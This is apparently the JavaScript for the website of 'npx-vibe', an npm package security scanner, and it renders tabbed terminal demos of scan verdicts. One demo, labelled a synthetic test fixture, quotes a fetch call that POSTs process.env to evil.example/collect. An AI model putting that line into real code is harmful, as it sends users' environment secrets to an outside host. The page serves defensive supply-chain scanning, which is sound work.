const demos = {
  proceed: `$ npx npx-vibe --check is-number
npx-vibe: Proceed  risk 0/100
is-number@7.0.0
Returns true if a number or string value is a finite number.

Downloads: 171,615,366/week  Package age: 4293d  Version age: 2911d
Install hooks: none
Inspected: 1 selected file from 4 package files
Established signals: long registry history, high weekly adoption,
multiple maintainers, linked GitHub repository
Review memory: first local scan of this package integrity.
AI review: skipped (No heuristic trigger required model review.)

Action: package may be executed.`,

  caution: `$ npx npx-vibe --check esbuild
! npx-vibe: Caution  risk 43/100
esbuild@0.28.1
An extremely fast JavaScript and CSS bundler and minifier.

Downloads: 241,858,907/week  Package age: 3132d  Version age: 12d
Install hooks: postinstall
Inspected: 3 selected files from 7 package files
Established signals: long registry history, high weekly adoption,
linked GitHub repository
Review memory: unchanged tarball since 2026-06-25; previous Caution 43/100.
AI review: skipped (Heuristic-only mode; AI was not requested.)

Findings:
- LOW      young_version
  This version was published 12 days ago.
- MEDIUM   lifecycle_hook in package.json
  postinstall runs: node install.js
  Evidence: postinstall: node install.js
- MEDIUM   network_and_shell in install.js
  Code combines network access with shell execution.
  Evidence line 147: function fetch(url) { ... https.get(url ...
  Evidence line 187: child_process.execSync("npm install ...")

Action: review recommended before execution.`,

  ai: `$ npx npx-vibe --check --ai online \\
  --provider gemini --model-profile balanced esbuild
! npx-vibe: Caution  risk 43/100
esbuild@0.28.1

Install hooks: postinstall
Inspected: 3 selected files from 7 package files
Review memory: unchanged tarball since 2026-06-25; previous Caution 43/100.
AI review: Gemini gemini-3.5-flash [balanced] (high confidence)
AI evidence: 0 source-backed findings

AI interpretation: The selected install script appears to resolve a
platform-specific binary. No additional source-backed credential access,
obfuscation, or persistence finding was identified, but deterministic
install-time network and process evidence remains.

Action: review recommended before execution.`,

  agent: `$ npx --yes npx-vibe@latest --agent esbuild
{
  "schemaVersion": 1,
  "tool": { "name": "npx-vibe", "version": "1.5.1" },
  "kind": "package-scan",
  "status": "complete",
  "decision": {
    "verdict": "caution",
    "riskScore": 43,
    "action": "review",
    "exitCode": 2,
    "mayContinue": false,
    "safeToExecute": false,
    "requiresApproval": true,
    "requiresHumanReview": true,
    "blocked": false,
    "mustStop": false
  },
  "subject": {
    "type": "package",
    "name": "esbuild",
    "requested": "latest",
    "version": "0.28.1"
  },
  "report": {
    "findings": [
      { "code": "lifecycle_hook", "file": "package.json" },
      { "code": "network_and_shell", "file": "install.js" }
    ]
  }
}`,

  block: `# Synthetic malicious fixture from the npx-vibe test suite
x npx-vibe: Block  risk 100/100
fixture: install-time secret exfiltration

Install hooks: postinstall

Findings:
- CRITICAL possible_secret_exfiltration in postinstall.js
  Code appears to access environment/secrets and perform network activity.
  Evidence line 1: fetch("https://evil.example/collect",
  { method: "POST", body: JSON.stringify(process.env) })

Action: blocked unless --force is supplied.`
};

const demoMeta = {
  proceed: "A typical clean package scan. No API key, model, or package execution is involved.",
  caution: "A real package with install-time behavior. Popularity provides context, but evidence still drives the recommendation.",
  ai: "Optional AI adds interpretation when requested. Deterministic findings remain the source of truth.",
  agent: "Agent mode returns schema-versioned JSON, disables local history writes, and pauses the workflow on Caution.",
  block: "Synthetic test fixture used to demonstrate a high-confidence block recommendation.",
};

const output = document.querySelector("#demo-output");
const note = document.querySelector("#demo-note");
const tabs = [...document.querySelectorAll(".demo-tab")];
const terminalPanel = document.querySelector(".terminal-panel");
const reduceMotion = window.matchMedia("(prefers-reduced-motion: reduce)").matches;

function setDemo(name) {
  if (!output || !demos[name]) return;

  output.textContent = demos[name];
  if (note) note.textContent = demoMeta[name];

  if (terminalPanel && !reduceMotion) {
    terminalPanel.classList.remove("is-switching");
    void terminalPanel.offsetWidth;
    terminalPanel.classList.add("is-switching");
  }

  tabs.forEach((tab) => {
    const active = tab.dataset.demo === name;
    tab.classList.toggle("active", active);
    tab.setAttribute("aria-selected", String(active));
  });
}

tabs.forEach((tab) => {
  tab.addEventListener("click", () => setDemo(tab.dataset.demo));
});

tabs.forEach((tab, index) => {
  tab.addEventListener("keydown", (event) => {
    const keys = ["ArrowLeft", "ArrowRight", "Home", "End"];
    if (!keys.includes(event.key)) return;

    event.preventDefault();
    let nextIndex = index;
    if (event.key === "ArrowLeft") nextIndex = (index - 1 + tabs.length) % tabs.length;
    if (event.key === "ArrowRight") nextIndex = (index + 1) % tabs.length;
    if (event.key === "Home") nextIndex = 0;
    if (event.key === "End") nextIndex = tabs.length - 1;

    const nextTab = tabs[nextIndex];
    setDemo(nextTab.dataset.demo);
    nextTab.focus();
  });
});

setDemo("proceed");

const siteHeader = document.querySelector(".site-header");

function updateHeader() {
  siteHeader?.classList.toggle("is-scrolled", window.scrollY > 12);
}

updateHeader();
window.addEventListener("scroll", updateHeader, { passive: true });

const revealItems = [...document.querySelectorAll("[data-reveal]")];

if (reduceMotion || !("IntersectionObserver" in window)) {
  revealItems.forEach((item) => item.classList.add("is-visible"));
} else {
  const revealObserver = new IntersectionObserver(
    (entries, observer) => {
      entries.forEach((entry) => {
        if (!entry.isIntersecting) return;
        entry.target.classList.add("is-visible");
        observer.unobserve(entry.target);
      });
    },
    { rootMargin: "0px 0px -10% 0px", threshold: 0.08 },
  );

  revealItems.forEach((item) => revealObserver.observe(item));
}

document.querySelectorAll("[data-copy]").forEach((button) => {
  const defaultText = button.textContent;

  button.addEventListener("click", async () => {
    try {
      await navigator.clipboard.writeText(button.dataset.copy);
      button.textContent = "Copied";
    } catch {
      button.textContent = "Copy failed";
    }

    setTimeout(() => {
      button.textContent = defaultText;
    }, 1300);
  });
});

const DOWNLOAD_API = "https://api.npmjs.org/downloads/range/last-week/npx-vibe";
const numberFormatter = new Intl.NumberFormat("en-US");

function animateNumber(element, total) {
  if (reduceMotion) {
    element.textContent = numberFormatter.format(total);
    return;
  }

  const duration = 700;
  const startedAt = performance.now();
  const step = (now) => {
    const progress = Math.min(1, (now - startedAt) / duration);
    const eased = 1 - (1 - progress) ** 3;
    element.textContent = numberFormatter.format(Math.round(total * eased));
    if (progress < 1) requestAnimationFrame(step);
  };

  requestAnimationFrame(step);
}

async function refreshDownloads() {
  const controller = new AbortController();
  const timeout = setTimeout(() => controller.abort(), 8000);

  try {
    const response = await fetch(DOWNLOAD_API, {
      headers: { accept: "application/json" },
      signal: controller.signal,
    });

    if (!response.ok) throw new Error(`npm API returned ${response.status}`);

    const payload = await response.json();
    const total = Array.isArray(payload.downloads)
      ? payload.downloads.reduce((sum, day) => sum + Number(day.downloads || 0), 0)
      : 0;

    if (!total) return;

    document.querySelectorAll("[data-weekly-downloads]").forEach((element) => {
      animateNumber(element, total);
      element.setAttribute(
        "title",
        `${numberFormatter.format(total)} downloads from ${payload.start} through ${payload.end}`
      );
    });
  } catch (error) {
    console.warn("Could not refresh npm download count:", error.message);
  } finally {
    clearTimeout(timeout);
  }
}

refreshDownloads();
